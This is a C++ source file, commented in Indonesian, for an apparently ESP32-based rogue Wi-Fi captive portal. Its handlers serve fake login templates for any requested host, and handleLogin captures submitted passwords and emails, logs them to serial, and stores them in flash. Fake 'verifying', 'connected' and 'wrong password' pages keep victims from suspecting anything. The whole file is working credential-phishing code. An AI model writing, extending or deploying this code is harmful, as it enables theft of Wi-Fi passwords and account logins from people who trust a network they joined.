#include "web_handlers.h"

#include <WebServer.h>
#include "state_machine.h"
#include "templates.h"
#include "web_remote.h"
#include "config_store.h"

// State yang didefinisikan di main.cpp.
extern WebServer server;
extern bool isReleasing;
extern bool isVerifying;
extern bool useCustomTemplate;
extern String g_customTemplate;
extern String capturedPass;
extern String capturedEmail;
extern unsigned long releaseTimer;

const char HTML_VERIFYING[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="10;url=/">
<title>Memverifikasi</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.spin{border:4px solid #eef2f5;border-top:4px solid #1e88e5;border-radius:50%;
width:52px;height:52px;animation:sp .9s linear infinite;margin:0 auto 20px}
@keyframes sp{to{transform:rotate(360deg)}}
h2{margin:0 0 8px;color:#1e88e5;font-size:20px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="spin"></div><h2>Memverifikasi...</h2>
<p>Mohon tunggu sebentar</p></div></body></html>
)raw";

const char HTML_SUCCESS[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Terhubung</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.ok{width:64px;height:64px;border-radius:50%;background:#22c55e;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#22c55e;font-size:22px}p{margin:0;color:#6b7280;font-size:14px}
</style></head><body><div class="card"><div class="ok">&#10003;</div>
<h2>Terhubung!</h2><p>Anda sekarang online</p></div></body></html>
)raw";

const char HTML_ERROR[] PROGMEM = R"raw(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Password Salah</title>
<style>
body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#2c5364);
min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:16px}
.card{background:#fff;border-radius:16px;padding:40px 30px;max-width:340px;width:100%;
text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);box-sizing:border-box}
.err{width:64px;height:64px;border-radius:50%;background:#ef4444;color:#fff;font-size:36px;
display:flex;align-items:center;justify-content:center;margin:0 auto 20px;line-height:1}
h2{margin:0 0 8px;color:#ef4444;font-size:22px}p{margin:0 0 22px;color:#6b7280;font-size:14px}
a{display:inline-block;padding:14px 32px;background:#1e88e5;color:#fff;text-decoration:none;
border-radius:10px;font-weight:600;font-size:15px}
</style></head><body><div class="card"><div class="err">&#10005;</div>
<h2>Password Salah</h2><p>Silakan coba lagi</p><a href="/">Coba Lagi</a></div></body></html>
)raw";

void handleRoot() {
  if (isWebRemoteRunning) {
    serveRemoteUI();
    return;
  }
  if (verifyState == 2) {
    server.send_P(200, "text/html", HTML_SUCCESS);
    return;
  }
  if (verifyState == 3) {
    verifyState = 0;
    server.send_P(200, "text/html", HTML_ERROR);
    return;
  }
  if (isReleasing || isVerifying || verifyState == 1) {
    server.send_P(200, "text/html", HTML_VERIFYING);
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send(200, "text/html", renderTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}

void handleLogin() {
  if (server.hasArg("password")) {
    capturedPass = server.arg("password");
    if (server.hasArg("email") && server.arg("email").length() > 0) {
      capturedEmail = server.arg("email");
    } else {
      capturedEmail = "WiFi-Pass";
    }
    Serial.printf("[LOGIN] %s / %s\n", capturedEmail.c_str(), capturedPass.c_str());
    savePasswordToNVS(capturedEmail, capturedPass);
    isReleasing = true;
    releaseTimer = millis();
    verifyState = 1;
    server.send_P(200, "text/html", HTML_VERIFYING);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}

void handleNotFound() {
  if (isWebRemoteRunning) {
    server.sendHeader("Location", "http://192.168.4.1/rc", true);
    server.send(302, "text/plain", "");
    return;
  }
  if (useCustomTemplate && g_customTemplate.length() > 0) {
    server.send(200, "text/html", g_customTemplate);
    return;
  }
  server.send(200, "text/html", renderTemplateForHost(server.hostHeader(), selectedTemplateIdx));
}